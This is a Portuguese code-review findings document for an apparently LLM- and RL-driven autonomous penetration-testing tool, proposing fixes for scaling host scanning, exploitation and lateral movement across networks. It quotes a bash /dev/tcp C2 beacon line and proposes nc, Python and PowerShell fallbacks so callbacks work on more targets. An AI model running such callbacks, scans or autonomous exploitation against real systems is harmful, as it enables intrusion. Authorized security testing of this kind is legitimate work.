# Findings de Código — Lente de Universalidade (alvo/rede/N arbitrários)

**Método:** leitura linha-a-linha dos módulos operacionais; cada finding cita `arquivo:linha`; cada fix preserva invariância a N e a alvo.
**Convenção:** 🔴 trava universalidade · 🟠 robustez · 🟡 débito/denúncia documentada

---

## 🔴 1. BLOQUEIOS DE UNIVERSALIDADE (consertar primeiro)

### 1.1 Teto de expansão hardcoded — `zeroday_hunt.py:515`
```python
ips += extras[:8]  # teto de expansao por run
```
- **Impacto:** com `--expand-all` em rede autorizada grande, apenas 8 hosts adicionais são caçados — silenciosamente.
- **Fix:** flag `--max-hosts N` (default: sem teto, o budget é o limite real); quando truncar, **logar** hosts não caçados no relatório (cobertura honesta).

### 1.2 Budget global sem alocação por host — `zeroday_hunt.py:run()` / `inventory.py limits`
- **Impacto:** wall-clock único dividido implicitamente pela ordem do sweep; hosts no fim da fila nem são visitados; relatório não diz o que ficou de fora.
- **Fix:** `--per-host-budget` com auto = `max(floor_360s, wall_clock/n_hosts)`; `_aggregate()` ganha `hosts_nao_cobertos` com motivo (`budget`, `safety`, `erro`).

### 1.3 subnet = 3º octeto IPv4 (semântica /24 embutida) — `state_adapter.py:288-291`
```python
octets = host_ip.split(".")
subnet_idx = int(octets[2]) if len(octets) == 4 and octets[2].isdigit() else 0
```
- **Impacto:** (a) redes /16 ou /8 → hosts de subredes distintas caem no mesmo grupo → arestas erradas → `LATERAL_MOVE` mask errada; (b) **IPv6 quebra** (vai para grupo 0 — todos conectados com todos); (c) inconsistente com `inventory.py`, que aceita qualquer CIDR via `ipaddress`.
- **Fix (mask-aware, ~15 linhas):**
```python
import ipaddress
def _subnet_group(ip: str, cidrs: list[str]) -> int:
    addr = ipaddress.ip_address(ip)
    for i, c in enumerate(cidrs):
        if addr in ipaddress.ip_network(c, strict=False):
            return i                       # grupo = índice do CIDR autorizado
    # dentro do mesmo CIDR grande, subdividir pela máscara relevante:
    return hash((addr.network_address, c))  # ou /24 interno derivado do CIDR
```
- Consumir em `sync_from_ruadan` com os CIDRs do inventário (o adapter não os recebe hoje → passar como parâmetro).

### 1.4 Arestas O(N²) remontadas a cada passo — `state_adapter.py:324-329` + `ai_orchestrator.py:281`
```python
for i in range(len(all_hosts)):
    for j in range(i + 1, len(all_hosts)):
        if all_hosts[i].subnet == all_hosts[j].subnet: ...
```
- **Impacto:** N=5k → 12,5M comparações **por passo** de campanha (×40 passos); e o resultado é idêntico entre passos consecutivos na maioria dos casos.
- **Fix:** agrupar por subnet com dict uma vez; arestar intra-grupo (O(Σ n_g²), já muito menor); manter cache e recomputar só quando `n_hosts` ou subnets mudarem (hosts novos).

### 1.5 Regex de evidência exige extensão — `zeroday_hunt.py:731`
```python
ev_path = re.compile(r"[\w.\-]+(/[\w.\-]+)+\.(json|txt|log|xml)$")
```
- **Impacto:** qualquer artefato válido sem uma dessas extensões → `confirmed` do LLM rebaixado a `suspect` **em qualquer alvo** (falso negativo de auditoria, não de segurança).
- **Fix:** aceitar path sob `evidence/` + verificação de existência real:
```python
ev_ok = ev.startswith("evidence/") and (run_dir / ev).exists()
```
(a auditoria `audit_hunt` já re-verifica arquivo+sha256 — o gate aqui só precisa não rejeitar o formato).

### 1.6 C2 beacon só-bash — `tools.py:403-404`
```python
beacon = f"timeout 8 bash -c 'exec 3<>/dev/tcp/{src_ip}/{port}; echo {token} >&3' ..."
```
- **Impacto:** alvo sem bash (appliance, busybox mínima, Windows) → callback OOB falha **silenciosamente** → prova executável perdida → achado real vira `suspect`. Atinge a promessa "qualquer host".
- **Fix (cadeia com verificação de rc):** bash → `nc -w 5` → `python3 -c socket` → `powershell` (1 linha cada, tenta em sequência; cada falha logada em `events.ndjson`).

### 1.7 nmap full-range sequencial por host — `zeroday_hunt.py:234-236`
- **Impacto:** 1 porta-range 1-65535 por host, 600s de timeout, N hosts em sequência → F1 domina o tempo da caça em rede média/grande.
- **Fix:** two-phase — top-1000 em todos os vivos; full-range apenas nos hosts cujo F1-lite revelou superfície (portas≥K ou banner com versão). Flag `--fast-first` (default ON para N>20).

### 1.8 Sem priorização de hosts — `zeroday_hunt.py:run()` (itera ordem do sweep)
- **Impacto:** com budget curto, hosts "chatos" consomem o tempo antes dos ricos.
- **Fix:** score de superfície pós-F1: `score = w1*n_portas + w2*tem_versao + w3*n_cve_candidatas`; ordenar a fila de caça. Reordenar é barato; a bateria e o LLM são os caros.

---

## 🟠 2. ROBUSTEZ (qualquer ambiente)

### 2.1 Warning de máscaras some após 1ª ocorrência — `agent.py:165, 452-459`
- Treino longo: 1 warning no log para 100k updates sem máscara.
- **Fix:** contador + re-logar a cada 1000 updates, ou `warn_once=False` no modo development.

### 2.2 `obs_all` (B,D)→(B,N,D) por repeat em development — `agent.py:463-482`
- Gradiente sobre N cópias idênticas ≠ gradiente real de N agentes; `confirmatory` já falha (correto), mas `development` sintetiza sem alerta no tensor.
- **Fix:** emitir `red_obs_repeat_applied` event (contável) — mesmo mantendo a resiliência.

### 2.3 Fallback heurístico ignora máscaras — `ai_orchestrator.py:375-400`
- Prioridade hardcoded (EXFILTRATE>…) sobre `valid_indices` filtrados por `am`, mas o **alvo** é `valid_targets[0]` sem checar pré-condição de kill chain.
- **Fix:** respeitar `tm[chosen_action]` na escolha do alvo (já calculada) — 3 linhas.

### 2.4 `pilot.py` subprocess sem timeout — `pilot.py:61,156`
- **Fix:** `subprocess.run(cmd, timeout=args.wall_clock + 300)`.

### 2.5 `exploit_search` automático sem cache por banner — `zeroday_hunt.py:453-458`
- Mesmo banner (produto+versão) em vários hosts → busca repetida (searchsploit é local, mas o parse custa).
- **Fix:** `self._exploit_cache: dict[str, dict]` por banner normalizado no `ZeroDayHunter`.

### 2.6 `self.events` cresce sem teto em RAM — `zeroday_hunt.py:184-193`
- ndjson já é a fonte de verdade; a lista só é usada p/ checar `terminate`.
- **Fix:** `self._terminated: bool` + contadores; dropar a lista (ou `deque(maxlen=1000)`).

### 2.7 ChannelPool sem LRU — `session.py:36,54,79`
- `ControlPersist=yes` mantém mux aberto por (host,cred) indefinidamente → fds e sockets acumulam em campanhas largas.
- **Fix:** LRU (ex: 64 canais ativos) com `-O exit` (já implementado em `session.py:79`) na expulsão.

### 2.8 Log duplicado em ~10 diretórios — `llm_client.py:244-281`
- `_write_log_entry` escreve+fsync em todos os candidatos a cada interação.
- **Fix:** 1 diretório via `RUADAN_OUTPUT_DIR` (env já existe); fallbacks removidos.

---

## 🟡 3. DESIGN NOTES (documentar, não "consertar" às cegas)

| Nota | Local | Implicação |
|---|---|---|
| GAT com node features **constantes** (`nf[:,:,0]=1.0`) | `agent.py:217-223` | GAT codifica só topologia → invariância ✓, discriminação de hosts fica no obs global + pointer. Roadmap: hf agregado no GAT sem quebrar invariância (relação c/ H4) |
| Adjacência **densa** (N,N) | `state_adapter.py:153-160` | N≤1k ok; >5k precisa sparse (COO) — roadmap |
| `MAX_AGENTS=32` | `shared/constants.py:385` | teto de **agentes** (não hosts); hoje n_agents=1 — registrar p/ MARL futuro |
| `HOST_FEAT_DIM=7` fixo | `shared/constants.py:384` | schema de features por host é estável — bom p/ checkpoints |
| `_local_source_ip` via socket :22 | `tools.py:96-105` | alvo sem :22 → c2_callback falha com erro honesto; melhorar com UDP-connect fake (sem pacote real) |
| `evidence/step%03d_` global por host | `tools.py:69-72` | padding não trunca (sem colisão); cosmético: namespace por host |
| heurística anti-loop promove p/ EXPLOITED_USER após 2 exploits consecutivos | `ai_orchestrator.py:263-278` | **cuidado**: promoção forçada sem evidência `credential` enfraquece o `evidence_level` honesto — revisar contra a política de veredito (rev8 #19) |

---

## 4. TESTES DE CONTRATO QUE FALTAM (além dos 96/96)

```python
# services/red_team/tests/test_update_contract.py (adicionar)
def test_update_next_masks_used_in_bootstrap():        # nam_b/nntm_b no actor_t (agent.py:637-645)
def test_update_gat_encoding_cur_next_bc():           # _encode_obs 3x com use_gat=True (agent.py:594-615)
def test_host_encoder_t_soft_update():                # tau em host_encoder_t (agent.py:775-779)

# services/pentest/tests/test_state_adapter.py (NOVO — protege a invariância)
def test_obs_invariant_to_n():                        # build_obs(N=10) == build_obs(N=500) p/ mesmo estado relativo
def test_masks_shape_any_n():                         # am (10,), tm (10, N) para N ∈ {1, 7, 50, 200}
def test_subnet_group_mask_aware():                   # /16: hosts de /24s distintos NÃO compartilham grupo (pós-fix 1.3)
def test_ipv6_hosts_no_crash():                       # adapter aceita host v6 (pós-fix 1.3)
def test_edges_incremental_not_quadratic():           # sync consecutiva não refaz arestas (pós-fix 1.4)

# services/pentest/tests/test_zeroday_hunt.py (adicionar)
def test_evidence_path_without_extension_accepted():  # pós-fix 1.5
def test_max_hosts_flag_limits_and_reports():         # pós-fix 1.1: hosts não caçados listados
def test_cve_fallback_for_unknown_product():          # candidata_searchsploit p/ produto fora da curadoria
def test_beacon_fallback_chain():                      # pós-fix 1.6: bash→nc→python→powershell
```

---

## 5. O QUE ESTÁ CORRETO E DEVE SER PROTEGIDO (regressão proibida)

| Invariante | Local | Por quê |
|---|---|---|
| obs/hf/tm **normalizados por fração** | `state_adapter.py:132-179` | é o que torna a política transferível p/ qualquer N |
| gate CIDR em TODA tool | `tools.py:_ip()` | escopo é contratos, não conveniência |
| credencial só do inventário | `tools.py:_cred_autorizada` | LLM não improvisa credenciais |
| confirmed exige prova executável + sha256 | `zeroday_hunt.py:audit_hunt:789-839` | núcleo anti-alucinação |
| mesmo operador de máscara act/update | `agent.py` rev8 | contrato π(a|s,M) |
| `confirmatory` fail-fast | `agent.py:446-451, 474-478` | erro de contrato não vira dado sintético |

---

## 6. TABELA-RESUMO (fix → esforço → destrava o quê)

| Fix | Esforço | Destrava |
|---|---|---|
| 1.5 regex evidência | ~5 linhas | confirmed válidos em qualquer alvo |
| 1.1 `--max-hosts` + log | ~15 linhas | redes grandes com expand-all |
| 1.6 beacon fallback | ~20 linhas | alvos não-bash (appliance/Windows) |
| 2.3 fallback respeita tm | ~3 linhas | campanha sem RL ativo |
| 2.4 timeout pilot | ~2 linhas | pilot não trava |
| 1.2 per-host budget | ~30 linhas | escala 10→100 hosts |
| 1.7 two-phase scan | ~25 linhas | escala 100→500 |
| 1.8 priorização | ~20 linhas | budget gasto onde rende |
| 1.3 subnet mask-aware | ~15 linhas | qualquer máscara + IPv6 |
| 1.4 arestas O(N²)→grupos | ~25 linhas | campanha em N≥500 |
| 2.7 LRU ChannelPool | ~20 linhas | campanha larga sem fd leak |

*Arquivo: `contexto/CODE_LEVEL_FINDINGS.md` — cada item citado com arquivo:linha para PR direto.*